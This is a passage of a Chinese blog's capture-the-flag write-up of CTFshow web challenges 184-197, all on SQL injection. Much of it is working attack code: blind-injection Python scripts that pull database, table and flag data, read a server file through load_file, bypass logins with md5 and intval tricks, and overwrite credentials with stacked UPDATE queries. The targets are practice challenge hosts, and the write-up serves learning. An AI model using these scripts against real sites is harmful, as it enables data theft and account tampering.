<h3 id="web-184"><a href="#web-184" class="headerlink" title="web-184"></a>web-184</h3><p>还是盲注，where没了，没法where like了，但是没有过滤空格，可以换成连接查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;http://56b6b2c0-66ee-458a-9693-bf7fe2a97be2.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="line">flagstr=&quot;&#125;&#123;-1234567890zxcasdqwertyfghvbnuiojklmZXCVBNMASDFGHJKLQWERTYUIOP&quot;</span><br><span class="line">flag=&#x27;ctfshow&#x27;</span><br><span class="line">for i in range(9,200):</span><br><span class="line">    for j in flag_str:</span><br><span class="line">        str_16=hex(ord(j))</span><br><span class="line">        payload=&#123;&quot;tableName&quot;:f&quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;i&#125;,100) like &#123;str_16&#125;25&quot;&#125;</span><br><span class="line">        r=requests.post(url,payload)</span><br><span class="line">        if &quot;$user_count = 43;&quot; in r.text:</span><br><span class="line">            flag=flag+j</span><br><span class="line">            print(flag)</span><br><span class="line">    if &#x27;&#125;&#x27;in flag:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<h3 id="web-185"><a href="#web-185" class="headerlink" title="web-185"></a>web-185</h3><p>用，true代替数字，true+true&#x3D;2</p>
<h3 id="web-186"><a href="#web-186" class="headerlink" title="web-186"></a>web-186</h3><p>concat()函数用于将两个字符串连接起来,形成一个单一的字符串</p>
<p>过滤了0-9，可以使用true拼接出数字，在使用char函数转换成字符，最后使用concat进行拼接。<br>比如想获取字符c,c的ascii为99<br>‘c’&#x3D;char(concat(true+true+true+true+true+true+true+true+true,true+true+true+true+true+true+true+true+true));<br>当然也可以复杂一点<br>c&#x3D;char(ture+ture+ture……) (99个true)<br>简单写个转换的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def convert(strs):</span><br><span class="line">	t=&#x27;concat(&#x27;</span><br><span class="line">	for s in strs:</span><br><span class="line">		t+= &#x27;char(true&#x27;+&#x27;+true&#x27;*(ord(s)-1)+&#x27;),&#x27;</span><br><span class="line">	return t[:-1]+&quot;)&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#author:yu22x</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=&quot;http://955c4204-b9de-433c-931d-5f7a0d9f0c51.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line">s=&#x27;0123456789abcdef-&#123;&#125;&#x27;</span><br><span class="line">def convert(strs):</span><br><span class="line">  t=&#x27;concat(&#x27;</span><br><span class="line">  for s in strs:</span><br><span class="line">    t+= &#x27;char(true&#x27;+&#x27;+true&#x27;*(ord(s)-1)+&#x27;),&#x27;</span><br><span class="line">  return t[:-1]+&quot;)&quot;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,45):</span><br><span class="line">  print(i)</span><br><span class="line">  for j in s:</span><br><span class="line">    d = convert(f&#x27;^ctfshow&#123;flag+j&#125;&#x27;)</span><br><span class="line">    data=&#123;</span><br><span class="line">    &#x27;tableName&#x27;:f&#x27; ctfshow_user group by pass having pass regexp(&#123;d&#125;)&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    #print(data)</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    #print(r.text)</span><br><span class="line">    if(&quot;user_count = 1&quot;  in r.text):</span><br><span class="line">      flag+=j</span><br><span class="line">      print(flag)</span><br><span class="line">      if j==&#x27;&#125;&#x27;:</span><br><span class="line">        exit(0)</span><br><span class="line">      break</span><br></pre></td></tr></table></figure>

<h3 id="web-187"><a href="#web-187" class="headerlink" title="web-187"></a>web-187</h3><p>当MD5函数的第二个参数为true时。返回的是字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br></pre></td></tr></table></figure>

<p><code>md5(&#39;ffifdyop&#39;,true)= &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code><br>会发现直接闭合掉了并且存在or，所以可以直接登录成功。</p>
<h3 id="web-188"><a href="#web-188" class="headerlink" title="web-188"></a>web-188</h3><p>想要拿flag需要输入的密码经过intval函数后等于查询出的密码。<br>注意这个地方用的两个等于号。<br>所以只要真正的密码是字母我们就可以通过输入密码为0来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=1||1</span><br><span class="line">password=0</span><br></pre></td></tr></table></figure>

<h3 id="web-189"><a href="#web-189" class="headerlink" title="web-189"></a>web-189</h3><p>直接盲注读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#author:yu22x</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=&quot;http://d2577b14-e91d-4f5e-b23a-73ff43862cec.challenge.ctf.show/api/index.php&quot;</span><br><span class="line">s=string.printable</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    print(i)</span><br><span class="line">    for j in range(32,128):</span><br><span class="line">        #print(chr(j))</span><br><span class="line">        data=&#123;&#x27;username&#x27;:f&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;i&#125;,1))=&#123;j&#125;,1,0)&quot;,</span><br><span class="line">&#x27;password&#x27;:&#x27;1&#x27;&#125;</span><br><span class="line">        #print(data)</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        #print(r.text)</span><br><span class="line">        if(&quot;\\u67e5\\u8be2\\u5931\\u8d25&quot; in r.text):        //查询失败</span><br><span class="line">            flag+=chr(j)  </span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h3 id="web-190"><a href="#web-190" class="headerlink" title="web-190"></a>web-190</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#author:yu22x</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=&quot;http://eb1ea450-7ad8-4a93-a682-4cdb5cf1adff.challenge.ctf.show/api/index.php&quot;</span><br><span class="line">s=string.ascii_letters+string.digits           </span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,45):</span><br><span class="line">    print(i)</span><br><span class="line">    for j in range(32,128):</span><br><span class="line">        #跑库名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;:f&quot;&#x27;||if(ascii(substr(database(),&#123;i&#125;,1))=&#123;j&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;:&#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        #跑表名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;:f&quot;&#x27;||if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))=&#123;j&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;:&#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        #跑列名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;:f&quot;&#x27;||if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1))=&#123;j&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;:&#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line">        #跑数据</span><br><span class="line">        data=&#123;</span><br><span class="line">            &#x27;username&#x27;:f&quot;&#x27;||if(ascii(substr((select f1ag from ctfshow_fl0g),&#123;i&#125;,1))=&#123;j&#125;,1,0)#&quot;,</span><br><span class="line">            &#x27;password&#x27;:&#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        if(&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in r.text):</span><br><span class="line">            flag+=chr(j)  </span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h3 id="web-191"><a href="#web-191" class="headerlink" title="web-191"></a>web-191</h3><p>MySQL中的ord()函数用于查找字符串中最左边的字符的代码。如果最左边的字符不是多字节字符,则返回ASCII值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;http://423be6bc-dbc4-4b51-805e-25b8a7e24d04.challenge.ctf.show/api/&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,66):</span><br><span class="line">    for j in range(0,128):</span><br><span class="line">        #payload=f&quot;-1&#x27; or ord(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;i&#125;,1))=&#123;j&#125;#&quot;</span><br><span class="line">        #payload=f&quot;-1&#x27; or ord(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1))=&#123;j&#125;#&quot;</span><br><span class="line">        payload=f&quot;-1&#x27; or ord(substr((select f1ag from ctfshow_fl0g),&#123;i&#125;,1))=&#123;j&#125;#&quot;</span><br><span class="line">        data=&#123;&quot;username&quot;:payload,</span><br><span class="line">        &quot;password&quot;:&#x27;1&#x27;&#125;</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in r.text:</span><br><span class="line">            flag=flag+chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        if j==127:</span><br><span class="line">            exit()</span><br><span class="line">    if &#x27;&#125;&#x27;in flag:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<h3 id="web-192"><a href="#web-192" class="headerlink" title="web-192"></a>web-192</h3><p>substr()</p>
<h3 id="web-193"><a href="#web-193" class="headerlink" title="web-193"></a>web-193</h3><p>mid()</p>
<h3 id="web-195"><a href="#web-195" class="headerlink" title="web-195"></a>web-195</h3><p>堆叠注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;update(ctfshow_user)set`username`=1;</span><br><span class="line">1;update(ctfshow_user)set`pass`=1;</span><br></pre></td></tr></table></figure>

<h3 id="web-196"><a href="#web-196" class="headerlink" title="web-196"></a>web-196</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0;select(1);&amp;password=1</span><br></pre></td></tr></table></figure>

<h3 id="web-197"><a href="#web-197" class="headerlink" title="web-197"></a>web-197</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1;show tables;&amp;password=ctfshow_user</span><br></pre></td></tr></table></figure>

<h3 id="。。。"><a href="#。。。" class="headerlink" title="。。。"></a>。。。</h3><p>。。。。。。sql注入这东西，个人感觉除了打比赛，目前为止，只需要了解最基本的就行了吧。不管了，以后如果需要深入的话再说吧。不过你可别偷懒哦。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/125169525">https://blog.csdn.net/miuzzx/article/details/125169525</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/125220318">https://blog.csdn.net/miuzzx/article/details/125220318</a></p>
<p>yu22x师傅的wp。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yake-daigua.top">yake-daigua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/">https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yake-daigua.top" target="_blank">yake-daigua</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTFSHOW/">CTFSHOW</a></div><div class="post_share"><div class="social-share" data-image="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/31/CTFSHOW_WP(254-378)/"><img class="prev-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">　CTFSHOW_WP(254-378)</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/29/2022%E5%B9%B49%E6%9C%88%E6%80%BB%E7%BB%93/"><img class="next-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/龍姫_68362502.png" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022年9月总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/10/31/CTFSHOW_WP(254-378)/" title="　CTFSHOW_WP(254-378)"><img class="cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-31</div><div class="title">　CTFSHOW_WP(254-378)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="author-info__name">yake-daigua</div><div class="author-info__description">爱蜜莉雅,我好喜欢你</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yake-daigua"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到yake-daigua的Blog，不定期更新技术总结文章和个人阶段性学习成果。加油啊，敲键盘的大哥哥。<img src="/img/loading.gif" data-original="https://npm.arcitcgn.cn/aciano-cdn@1.0.10/Yay.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-5"><span class="toc-number">1.1.</span> <span class="toc-text">web-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-6"><span class="toc-number">1.2.</span> <span class="toc-text">web-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-7"><span class="toc-number">1.3.</span> <span class="toc-text">web-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-8"><span class="toc-number">1.4.</span> <span class="toc-text">web-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-9"><span class="toc-number">1.5.</span> <span class="toc-text">web-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-11"><span class="toc-number">1.6.</span> <span class="toc-text">web-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-12"><span class="toc-number">1.7.</span> <span class="toc-text">web-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-13"><span class="toc-number">1.8.</span> <span class="toc-text">web-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-14"><span class="toc-number">1.9.</span> <span class="toc-text">web-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-15"><span class="toc-number">1.10.</span> <span class="toc-text">web-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-16"><span class="toc-number">1.11.</span> <span class="toc-text">web-16*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-17"><span class="toc-number">1.12.</span> <span class="toc-text">web-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-18"><span class="toc-number">1.13.</span> <span class="toc-text">web-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-20"><span class="toc-number">1.14.</span> <span class="toc-text">web-20*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">2.</span> <span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-21"><span class="toc-number">2.1.</span> <span class="toc-text">web-21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-22"><span class="toc-number">2.2.</span> <span class="toc-text">web-22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-23"><span class="toc-number">2.3.</span> <span class="toc-text">web-23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-24"><span class="toc-number">2.4.</span> <span class="toc-text">web-24*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-25"><span class="toc-number">2.5.</span> <span class="toc-text">web-25*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-27"><span class="toc-number">2.6.</span> <span class="toc-text">web-27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-28"><span class="toc-number">2.7.</span> <span class="toc-text">web-28</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-29"><span class="toc-number">3.1.</span> <span class="toc-text">web-29*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-30"><span class="toc-number">3.2.</span> <span class="toc-text">web-30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-31"><span class="toc-number">3.3.</span> <span class="toc-text">web-31*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-32"><span class="toc-number">3.4.</span> <span class="toc-text">web-32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-33"><span class="toc-number">3.5.</span> <span class="toc-text">web-33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-34"><span class="toc-number">3.6.</span> <span class="toc-text">web-34</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-35"><span class="toc-number">3.7.</span> <span class="toc-text">web-35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-36"><span class="toc-number">3.8.</span> <span class="toc-text">web-36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-37"><span class="toc-number">3.9.</span> <span class="toc-text">web-37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-38"><span class="toc-number">3.10.</span> <span class="toc-text">web-38*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-39"><span class="toc-number">3.11.</span> <span class="toc-text">web-39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-40"><span class="toc-number">3.12.</span> <span class="toc-text">web-40*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-41"><span class="toc-number">3.13.</span> <span class="toc-text">web-41*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-42"><span class="toc-number">3.14.</span> <span class="toc-text">web-42*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-43"><span class="toc-number">3.15.</span> <span class="toc-text">web-43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-44"><span class="toc-number">3.16.</span> <span class="toc-text">web-44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-45"><span class="toc-number">3.17.</span> <span class="toc-text">web-45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-46"><span class="toc-number">3.18.</span> <span class="toc-text">web-46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-47"><span class="toc-number">3.19.</span> <span class="toc-text">web-47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-48"><span class="toc-number">3.20.</span> <span class="toc-text">web-48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-49"><span class="toc-number">3.21.</span> <span class="toc-text">web-49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-50"><span class="toc-number">3.22.</span> <span class="toc-text">web-50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-51"><span class="toc-number">3.23.</span> <span class="toc-text">web-51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-52"><span class="toc-number">3.24.</span> <span class="toc-text">web-52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-53"><span class="toc-number">3.25.</span> <span class="toc-text">web-53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-54"><span class="toc-number">3.26.</span> <span class="toc-text">web-54*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-55"><span class="toc-number">3.27.</span> <span class="toc-text">web-55*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-56"><span class="toc-number">3.28.</span> <span class="toc-text">web-56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-57"><span class="toc-number">3.29.</span> <span class="toc-text">web-57*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-58"><span class="toc-number">3.30.</span> <span class="toc-text">web-58*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-66"><span class="toc-number">3.31.</span> <span class="toc-text">web-66</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-68"><span class="toc-number">3.32.</span> <span class="toc-text">web-68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-70"><span class="toc-number">3.33.</span> <span class="toc-text">web-70</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-71"><span class="toc-number">3.34.</span> <span class="toc-text">web-71</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-72"><span class="toc-number">3.35.</span> <span class="toc-text">web-72*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-73"><span class="toc-number">3.36.</span> <span class="toc-text">web-73</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-74"><span class="toc-number">3.37.</span> <span class="toc-text">web-74*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-75"><span class="toc-number">3.38.</span> <span class="toc-text">web-75</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-77"><span class="toc-number">3.39.</span> <span class="toc-text">web-77*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-118"><span class="toc-number">3.40.</span> <span class="toc-text">web-118*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-119"><span class="toc-number">3.41.</span> <span class="toc-text">web-119</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-120"><span class="toc-number">3.42.</span> <span class="toc-text">web-120</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-121"><span class="toc-number">3.43.</span> <span class="toc-text">web-121</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-122"><span class="toc-number">3.44.</span> <span class="toc-text">web-122</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-124"><span class="toc-number">3.45.</span> <span class="toc-text">web-124*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-78"><span class="toc-number">4.1.</span> <span class="toc-text">web-78</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-79"><span class="toc-number">4.2.</span> <span class="toc-text">web-79</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-80"><span class="toc-number">4.3.</span> <span class="toc-text">web-80*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-82"><span class="toc-number">4.4.</span> <span class="toc-text">web-82*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-83"><span class="toc-number">4.5.</span> <span class="toc-text">web-83</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-84"><span class="toc-number">4.6.</span> <span class="toc-text">web-84</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-85"><span class="toc-number">4.7.</span> <span class="toc-text">web-85*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-86"><span class="toc-number">4.8.</span> <span class="toc-text">web-86</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-87"><span class="toc-number">4.9.</span> <span class="toc-text">web-87*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-88"><span class="toc-number">4.10.</span> <span class="toc-text">web-88</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-116"><span class="toc-number">4.11.</span> <span class="toc-text">web-116</span></a></li><li class="toc-item toc-level-3"><a 